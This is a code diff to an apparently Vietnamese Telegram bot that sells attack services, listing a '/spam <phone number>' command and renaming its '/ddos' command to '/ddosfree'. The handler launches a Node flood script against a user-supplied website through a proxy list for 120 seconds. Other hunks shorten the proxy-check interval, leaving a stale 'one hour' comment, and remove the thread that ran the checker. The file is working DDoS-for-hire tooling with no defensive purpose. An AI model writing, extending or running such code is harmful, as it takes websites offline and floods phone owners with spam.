@@ -136,7 +136,7 @@ def help(message):
 ┃  Lệnh Free
 ┗━━━━━━━━━━━━━━➤
 - /spam <số điện thoại> : Để tiến hành spam
-- /ddos <link website> : Để tiến hành tấn công ddos
+- /ddosfree <link website> : Để tiến hành tấn công ddos
 ┏━━━━━━━━━━━━━━┓
 ┃  Lệnh Có Ích
 ┗━━━━━━━━━━━━━━➤
@@ -159,7 +159,7 @@ def nhapkeyvip(message):
 @bot.message_handler(commands=['vip'])
 def vipsms(message):
     pass
-@bot.message_handler(commands=['ddos'])
+@bot.message_handler(commands=['ddosfree'])
 def didotv(message):
     pass
 @bot.message_handler(commands=['setflood'])
@@ -200,7 +200,7 @@ def run_attack(command, duration, message):
             cmd_process.wait()
             return
 
-@bot.message_handler(commands=['ddos'])
+@bot.message_handler(commands=['ddosfree'])
 def ddos_command(message):
     user_id = message.from_user.id
     
@@ -225,8 +225,8 @@ def ddos_command(message):
         return
     
     host = message.text.split()[1]
-    command = ["node", "TLSCLF.js", host, "90", "64", "2", "proxy.txt"]
-    duration = 90
+    command = ["node", "flood.js", host, "120", "8", "proxy.txt", "64", "15"]
+    duration = 120
 
     cooldown_dict[username] = {'attack': current_time}
 
@@ -493,7 +493,7 @@ def run_proxy_script():
 # Hàm tự kiểm tra proxy mỗi giờ
 def auto_check_proxy():
     while True:
-        time.sleep(3600)  # Đợi 1 giờ
+        time.sleep(600)  # Đợi 1 giờ
         proxy_count = check_proxy()
         print(f"Số proxy hiện có: {proxy_count}")  # Log cho admin
 
@@ -511,7 +511,4 @@ def update_proxy(message):
 def invalid_command(message):
     bot.reply_to(message, 'Lệnh không hợp lệ. Vui lòng sử dụng lệnh /help để xem danh sách lệnh.')
 
-thread = threading.Thread(target=auto_check_proxy)
-thread.daemon = True
-thread.start()
 bot.infinity_polling(timeout=60, long_polling_timeout = 1)
